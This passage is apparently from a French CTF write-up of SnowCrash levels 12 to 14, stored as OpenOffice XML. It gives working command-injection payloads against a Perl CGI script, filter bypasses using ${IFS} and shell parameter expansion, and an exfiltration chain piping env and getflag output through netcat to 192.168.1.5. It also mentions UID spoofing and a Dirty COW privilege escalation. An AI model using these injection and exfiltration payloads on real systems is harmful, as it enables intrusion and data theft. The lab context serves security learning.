      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T35">return</text:span> <text:span text:style-name="T38">0</text:span><text:span text:style-name="T36">;</text:span></text:p>
      <text:p text:style-name="P46">}</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><text:span text:style-name="T35">sub </text:span><text:span text:style-name="T39">n</text:span> <text:span text:style-name="T36">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T35">if</text:span><text:span text:style-name="T36">(</text:span><text:span text:style-name="T34">$_</text:span><text:span text:style-name="T36">[</text:span><text:span text:style-name="T38">0</text:span><text:span text:style-name="T36">]</text:span> <text:span text:style-name="T36">==</text:span> <text:span text:style-name="T38">1</text:span><text:span text:style-name="T36">)</text:span> <text:span text:style-name="T36">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T35">print</text:span><text:span text:style-name="T36">(</text:span><text:span text:style-name="T37">".."</text:span><text:span text:style-name="T36">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T36">}</text:span> <text:span text:style-name="T35">else</text:span> <text:span text:style-name="T36">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T35">print</text:span><text:span text:style-name="T36">(</text:span><text:span text:style-name="T37">"."</text:span><text:span text:style-name="T36">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T36">}</text:span> <text:s text:c="3"/></text:p>
      <text:p text:style-name="P46">}</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P26"><text:span text:style-name="T36">n(t(param(</text:span><text:span text:style-name="T37">"x"</text:span><text:span text:style-name="T36">),</text:span> <text:span text:style-name="T36">param(</text:span><text:span text:style-name="T37">"y"</text:span><text:span text:style-name="T36">)));</text:span></text:p>
      <text:p text:style-name="P3">Le script dans son ensemble a un fonctionnement "normal" assez anecdotique, dans le sens où il prend deux paramètres d'URL (x et y), qu'il utilise le premier pour construire une commande <text:span text:style-name="T5">egrep</text:span> (grep avec des expressions régulières) sur le fichier <text:span text:style-name="T5">/tmp/xd</text:span>, avant d'examiner sur chaque ligne avec comme séparateur ":". Si une expression match le paramètre <text:span text:style-name="T5">y</text:span>, alors on renvoie 1 et on affiche deux points, sinon on affiche un seul point.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">L'important pour comprendre ce script est ici l'opérateur PERL <text:span text:style-name="T5">~=</text:span> ; celui-ci permet de tester / de lier une chaîne de caractères à une expression régulière (<text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/10019049/what-does-do-in-perl" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">voir ici</text:a>).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Dans la fonction <text:span text:style-name="T5">t</text:span>, les deux expressions régulières opérées sur la variable <text:span text:style-name="T5">$xx</text:span> effectuent les actions suivantes (elles ne sont pas que des tests) :</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/>&gt; Premièrement, toutes les minuscules sont transformées en majuscules (<text:span text:style-name="T5">tr </text:span>remplace une à une tous les caractères de la première chaîne avec ceux de la seconde).</text:p>
      <text:p text:style-name="P3">&gt; Deuxièmement, on remplace tous les caractères précédés par un espace par rien du tout (<text:span text:style-name="T5">s </text:span>est la regex de substitution, \s représente tous les whitespaces, . n'importe quel caractère; * n'importe quel nombre de caractères).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">En d'autres termes, la variable <text:span text:style-name="T5">$xx</text:span> (i.e. notre paramètre d'URL <text:span text:style-name="T5">x</text:span>) ne peut contenir que des majuscules, et aucun espace.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">En gardant cela à l'esprit, on voit ici que la variable <text:span text:style-name="T5">$xx</text:span>, dont nous contrôlons (pas librement à cause des filtres) le contenu est intégré dans une exécution de commande PERL, lors de la construction de sa commande <text:span text:style-name="T5">egrep</text:span>. Il s'agira donc de notre point d'injection.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">En sachant que l'on ne peut utiliser aucune lettre minuscule et aucuns espaces, il est difficile (mais pas impossible, voir <text:span text:style-name="T1">unintended way</text:span><text:span text:style-name="T6"> ci-dessous) de produire une injection classique de commandes. Ce que l'on peut cependant faire, c'est mettre au maximum à profit ce qui est déjà dans la chaîne ; c'est à dire, le fichier </text:span><text:span text:style-name="T7">/tmp/xd</text:span><text:span text:style-name="T6">.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3"><text:span text:style-name="T6">Ce dernier se trouve dans un dossier sur lequel on a les droits d'écriture. On peut donc manipuler le fichier. Imaginons qu'on transforme ce fichier en un script bash qui exécute des commandes arbitraires, puis que l'on trouve un moyen pour que le script PERL l'exécute, en tant que </text:span><text:span text:style-name="T7">flag12</text:span><text:span text:style-name="T6">, on aura réussi le challenge.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Rappelons-nous que le point d'injection a la configuration suivante :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">egrep "^[VARIABLE]" /tmp/xd 2&gt;&amp;1</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Après avoir cherché un peu, après avoir fait tourner le script en local pour afficher la commande construite par son exécution depuis la ligne de commandes, on en arrive au payload suivant :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">*"${IFS}/;DUMMY=2"</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3"><text:span text:style-name="T6">(Notons que ${IFS} est, dans toutes les shells, la variable de séparateur de champ, et vaut par défaut </text:span><text:span text:style-name="T7">space</text:span><text:span text:style-name="T6">). Un tel payload produira la commande suivante, exécutée par le script :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">egrep "^*" /;DUMMY=2"" /tmp/xd 2&gt;&amp;1</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; ${IFS} a donc été utilisé pour simuler un espace.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; La première commande egrep va échouer car on essaie d'ouvrir le dossier racine, mais peu importe pour nous.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; On débute une nouvelle commande avec un point-virgule.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; On doit encore se débarrasser d'une <text:span text:style-name="T1">double-quote</text:span><text:span text:style-name="T6">. On a essayé quelques manières, simplement avoir "" avant une commande ne fonctionne pas. Une façon prometteuse était d'utiliser la variable d'environnement $SHELL, et donc d'avoir "$SHELL" /tmp/xd 2&gt;&amp;1, ce qui fonctionnait bien en local. Cependant cela échouait sur SnowCrash, probablement car la variable d'environnement $SHELL n'existait pas lors du lancement de la commande. On a fini par se rendre compte qu'on pouvait définir une variable avant une commande, et terminer la définition par "", avant d'exécuter correctement la commande.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3"><text:span text:style-name="T6">&gt; <text:s/>Lorsqu'on fournit un chemin absolu, un script peut être exécuté sans avoir à le préfixer par </text:span><text:span text:style-name="T17">./</text:span><text:span text:style-name="T6"> ou </text:span><text:soft-page-break/><text:span text:style-name="T6">un programme shell.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">BREF, on va réussir grâce à cette configuration à exécuter le fichier <text:span text:style-name="T11">/tmp/xd</text:span>, sur lequel on a les droits d'écriture. On inscrit le payload suivant dans <text:span text:style-name="T11">/tmp/xd</text:span> (et on le rend exécutable) :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">#!/bin/bash</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">getflag &gt; /tmp/pasta</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Puis on URL encode notre payload (j'ai utilisé <text:a xlink:type="simple" xlink:href="https://gist.github.com/cdown/1163649" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">ce script bash</text:a>), avant d'envoyer notre cURL :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr4" draw:name="images44" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.203cm" draw:z-index="43"><draw:image xlink:href="Pictures/2000000700004C97000009EDC165327B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images45" text:anchor-type="paragraph" svg:width="13.919cm" svg:height="2.381cm" draw:z-index="44"><draw:image xlink:href="Pictures/200000070000365E0000094E1D85C6B8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">Got <text:span text:style-name="T5">flag</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P12">b. Unintended way</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Il y avait en réalité une autre façon d'obtenir le flag, par le biais d'une injection plus sophistiquée, mais qui permet de ne pas se reposer sur le fichier <text:span text:style-name="T5">/tmp/xd</text:span>. Elle est donc plus modulaire et permet d'exécuter des commandes arbitraires malgré le filtre des espaces et des majuscules.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Il s'agit d'une technique qu'on a déjà utilisé sur une machine HackTheBox, <text:span text:style-name="T5">Unbalanced </text:span>(HackTheBox_Shocker.odt), et démontrée dans le cadre de CVE-2020-8816. La vulnérabilité affectait Pihole, et une RCE était envisageable, sauf qu'un filtre passant le payload en majuscule et interdisant les espaces était en place. Comme dans notre configuration actuelle donc.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">La technique était d'utiliser des variables d'environnement afin de produire des lettres minuscules, par le biais de la mécanique de <text:span text:style-name="T5">parameter expansion</text:span> des shells.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Pour reprendre un bref exemple (tout est mieux expliqué dans <text:span text:style-name="T5">Unbalanced</text:span>), considérons que nous avons le $PATH suivant :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P25"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T14">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</text:span></text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Pour obtenir un 'c', on peut faire :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">W=${PATH#/???/??};C=${W%%??/*}</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images46" text:anchor-type="paragraph" svg:width="10.029cm" svg:height="2.037cm" draw:z-index="45"><draw:image xlink:href="Pictures/200000070000272D000007F691A8C83D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P3">La première variable W retire le premier pattern qui match, c'est-à-dire ici <text:span text:style-name="T11">/usr/lo</text:span> ; puis la variable C retire de cette variable W le pattern qui match, c'est-à-dire ici <text:span text:style-name="T11">al/[tout le reste]</text:span>. Il ne reste ensuite que le 'c' de "local".</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On peut ensuite utiliser <text:span text:style-name="T11">$C</text:span> pour simuler un 'c', sans avoir recouru à aucune lettre minuscule.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">En gros, l'idée est d'utiliser cette technique afin de créer toutes les lettres dont on aurait besoin pour exécuter nos commandes arbitraires. Le problème qu'on rencontre ici est le suivant : pour que cette technique fonctionne, il faut connaître les variables d'environnement avec lesquelles la commande est exécutée afin de pouvoir se servir de leur contenu. Dans le cadre de la CVE de <text:span text:style-name="T5">Pihole</text:span>, le leak des variables d'environnement était assez simple, puisque l'output des commandes injectées étaient retournées sur la page web. Il suffisait alors d'injecter <text:span text:style-name="T5">$PATH</text:span> pour que nous soit simplement renvoyé la variable d'environnement PATH.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On ne peut pas procéder ainsi ici, puisque rien ne nous est renvoyé. Cependant, on se rappelle que le serveur apache2 dispose d'un log des erreurs qu'il rencontre, à <text:span text:style-name="T5">/var/log/apache2/error.log</text:span>. On va se servir de ce log pour produire un leak de variables d'environnement.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On utilise le payload suivant, ce qui produira la commande juste en-dessous :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">*"${IFS}/;$PATH;"</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">egrep "^*" /;$PATH;"" /tmp/xd 2&gt;&amp;1</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">L'idée ici est de provoquer une erreur lorsque notre shell va essayer d'exécuter la commande du milieu, <text:span text:style-name="T11">$PATH</text:span>. Un message d'erreur est renvoyé par la shell nous affirmant qu'elle ne peut trouver la commande que nous souhaitons exécuter, mais dans le message d'erreur, la variable d'environnement est bien <text:span text:style-name="T1">expanded</text:span><text:span text:style-name="T6">, ce qui nous la révèle :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr3" draw:name="images47" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="4.598cm" draw:z-index="46"><draw:image xlink:href="Pictures/2000000700005A21000018658D89DAC8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">On connaît désormais la variable d'environnement <text:span text:style-name="T11">$PATH</text:span> utilisée lorsque le script tourne. Ce qui nous donne pas mal de lettres. On arrive également à révéler <text:span text:style-name="T11">$PWD</text:span>, mais aucune autre variable d'environnement classique.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On a donc à notre disposition :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">[$PATH] <text:tab/>/usr/local/bin:/usr/bin:/bin</text:p>
      <text:p text:style-name="P9">[$PWD]<text:tab/>/var/www/level12</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P3">Cela reste relativement peu de lettres minuscules à notre disposition malheureusement. Cependant, on se rend compte qu'on a suffisamment de lettres pour nous permettre de construire la commande suivante :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">env | nc 192.168.1.5 1234</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">En effet, on a besoin que des caractères 'e' – 'n' – 'v' – 'c'. Avec un listener netcat sur notre machine locale, l'intégralité de l'environnement utilisé par le script nous sera ainsi communiqué !</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On récupère ces différents caractères en considérant bien la configuration des variables d'environnement :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">'n'<text:tab/>T=${PATH#/???/?????/??};N=${T%%:*} </text:p>
      <text:p text:style-name="P9">'c'<text:tab/>S=${PATH#/???/??};C=${S%%??/*} </text:p>
      <text:p text:style-name="P9">'v'<text:tab/>Z=${PWD#/};V=${Z%%??/*} </text:p>
      <text:p text:style-name="P9">'e'<text:tab/>W=${PWD#/???/???/?};E=${W%%????2*} </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Et on construit notre payload :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">*"$IFS/;T=${PATH#/???/?????/??};N=${T%%:*};S=${PATH#/???/??};C=${S%%??/*};W=${PWD#/???/???/?};E=${W%%????2};Z=${PWD#/};V=${Z%%??/*};${IFS}$E$N$V${IFS}|$N$C${IFS}192.168.1.5${IFS}1234;" </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">(en remplaçant les IFS par les espaces)</text:p>
      <text:p text:style-name="P9">*" /;T=${PATH#/???/?????/??};N=${T%%:*};S=${PATH#/???/??};C=${S%%??/*};W=${PWD#/???/???/?};E=${W%%????2};Z=${PWD#/};V=${Z%%??/*}; $E$N$V |$N$C 192.168.1.5 1234;" </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On URL encode tout ça, et on envoie notre cURL. On reçoit bien le résultat de la commande <text:span text:style-name="T5">env </text:span>sur notre netcat listener :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images48" text:anchor-type="paragraph" svg:width="20.749cm" svg:height="9.802cm" draw:z-index="47"><draw:image xlink:href="Pictures/2000000700007234000035F4ED141EE4.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/>On aperçoit deux variables d'environnement qui peuvent nous être très utiles, <text:span text:style-name="T5">QUERY_STRING </text:span>et <text:span text:style-name="T5">REQUEST_URI</text:span>. Ces dernières contiennent l'URL qu'on a entré dans notre cURL, on en contrôle donc le contenu.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Imaginons donc que je veuille passer le résultat de la commande <text:span text:style-name="T5">getflag</text:span> à mon listener netcat, au lieu de <text:span text:style-name="T5">env</text:span>. J'utiliserai l'URL suivante :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">http://192.168.1.16:4646/?y=getflag&amp;x=[PAYLOAD]</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Avec une telle URL, notre variable d'environnement <text:span text:style-name="T5">QUERY_STRING </text:span>aura la structure :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">/?y=getflag&amp;x=[PAYLOAD]</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Je peux donc récupérer (d'un coup) la string <text:span text:style-name="T5">getflag</text:span> de cette façon :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">U=${QUERY_STRING#??};GETFLAG=${U%%??=*} </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Voici le payload final pour effectuer la commande <text:span text:style-name="T5">getflag</text:span> et passer l'output à netcat :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">'*"$IFS/;T=${PATH#/???/?????/??};N=${T%%:*};S=${PATH#/???/??};C=${S%%??/*};U=${QUERY_STRING#??};GETFLAG=${U%%??=*};${IFS}$GETFLAG${IFS}|$N$C${IFS}192.168.1.5${IFS}1234;$IFSecho$IFS" </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On URL encode ça, et on le passe à cURL, en se rappelant qu'il faut utiliser l'URL suivante :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">curl 'http://192.168.1.16:4646/?y=getflag&amp;x=[PAYLOAD]'</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Et on récupère bien, sur notre listener <text:span text:style-name="T5">netcat</text:span>, l'output de la commande <text:span text:style-name="T5">getflag</text:span> :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images49" text:anchor-type="paragraph" svg:width="14.499cm" svg:height="1.984cm" draw:z-index="48"><draw:image xlink:href="Pictures/20000007000038A4000007C12C86188E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Et cette approche se révèle finalement assez modulaire, puisqu'on peut insérer dans l'URI n'importe quelle commande qu'on souhaite exécuter, puis en récupérer le string, en minuscule, dans les variables d'environnement du script. Il s'agit d'un exploit qui ne dépend pas de la commande construite par le script PERL initial (ou, en tout cas, moins, puisqu'on ne dépend pas du fichier <text:span text:style-name="T5">/tmp/xd</text:span>).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P14">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list5143613958016452691" text:style-name="L19">
        <text:list-item>
          <text:p text:style-name="P61">Level 13</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Dans le dossier home de l'utilisateur <text:span text:style-name="T5">level13</text:span>, on trouve un simple binaire ELF SUID / SGID. Lorsqu'on essaie de le démarrer sans aucun argument, on a le message d'erreur suivant :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">UID 2013 started us but we expect 4242</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Il semble donc que le programme vérifie l'UID <text:span text:style-name="T1">réel</text:span><text:span text:style-name="T6"> de l'utilisateur qui démarre le programme, et qu'il ne fonctionne correctement que si cet UID est 4242. Aucun utilisateur dans </text:span><text:span text:style-name="T15">/etc/passwd</text:span><text:span text:style-name="T6"> ne </text:span><text:soft-page-break/><text:span text:style-name="T6">dispose de cet UID, on a vérifié, il va donc falloir le manipuler.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3"><text:span text:style-name="T6">Bref, transférons le fichier sur Kali pour le décompiler. On se rend compte qu'il n'y a qu'une fonction </text:span><text:span text:style-name="T7">main </text:span><text:span text:style-name="T6">très basique :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images51" text:anchor-type="paragraph" svg:width="12.594cm" svg:height="7.437cm" draw:z-index="49"><draw:image xlink:href="Pictures/200000070000313300001D0C571E5D48.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T6">Cette fonction récupère le </text:span><text:span text:style-name="T1">real ID </text:span><text:span text:style-name="T6">et vérifie s'il est égal à 4242. Si ce n'est pas le cas, on </text:span><text:span text:style-name="T7">exit</text:span><text:span text:style-name="T6">. S'il est bien égal à 4242, on déchiffre un string encrypté avec une fonction </text:span><text:span text:style-name="T7">ft_des</text:span><text:span text:style-name="T6"> qui est également présente dans le programme.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3"><text:span text:style-name="T6">De là, pour récupérer le token, on a deux options : soit on essaie de reverse engineer la fonction </text:span><text:span text:style-name="T7">ft_des</text:span><text:span text:style-name="T6"> pour reconstruire le token ; soit on prend une voie bien plus simple, et on crée un utilisateur sur notre machine Kali avec l'UID </text:span><text:span text:style-name="T7">4242</text:span><text:span text:style-name="T6">, puis on exécute le programme avec cet utilisateur.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On choisi la seconde option :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images50" text:anchor-type="paragraph" svg:width="16.962cm" svg:height="10.135cm" draw:z-index="50"><draw:image xlink:href="Pictures/2000000700004241000027976F2F3670.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4"><text:soft-page-break/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T6">On récupère le token, qui nous permet de nous log en tant que </text:span><text:span text:style-name="T7">level14</text:span><text:span text:style-name="T6">.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P14">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:list xml:id="list2808072888361842431" text:style-name="L20">
        <text:list-item>
          <text:p text:style-name="P62">Level 14</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P10"><text:span text:style-name="T8">On récupère </text:span><text:span text:style-name="T7">root </text:span><text:span text:style-name="T8">exactement comme décrit dans </text:span><text:span text:style-name="T4">1. Level 00 </text:span><text:span text:style-name="T8">(sauf qu'on peut maintenant nommer notre fichier d'exploit "dirty", indiquant que c'était bien pour ce dernier flag qu'on était censé utiliser ce privesc). De là, on </text:span><text:span text:style-name="T16">su flag14</text:span><text:span text:style-name="T8">, et on fait un </text:span><text:span text:style-name="T16">getflag</text:span><text:span text:style-name="T8"> pour récupérer notre flag </text:span><text:span text:style-name="T6">¯\_(ツ)_/¯ </text:span><text:span text:style-name="T8">.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P14">[OK]<text:tab/>Flag</text:p>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7H37M55S</meta:editing-duration>
    <meta:editing-cycles>26</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-12-15T00:23:07.79</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="53" meta:object-count="0" meta:page-count="35" meta:paragraph-count="573" meta:word-count="8254" meta:character-count="50552"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>